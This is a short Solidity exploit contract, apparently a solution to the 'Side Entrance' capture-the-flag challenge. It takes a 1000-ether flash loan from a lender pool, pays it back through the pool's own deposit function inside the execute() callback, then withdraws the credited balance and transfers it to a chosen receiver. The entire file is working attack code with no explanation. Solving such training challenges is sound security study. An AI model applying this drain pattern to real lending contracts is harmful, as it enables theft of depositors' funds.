// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";


contract exploit3{


    SideEntranceLenderPool private pool;

    constructor(address _pool){
        pool = SideEntranceLenderPool(_pool);
    }
     function execute() external payable{
        pool.deposit{value: msg.value}();
     }

     function withdrawEth(address payable receiver) public payable{
        pool.withdraw();
        receiver.transfer(address(this).balance);

     }

     function executeFlashLoan() public{
        pool.flashLoan(1000 ether);
     }

     receive() external payable{}
}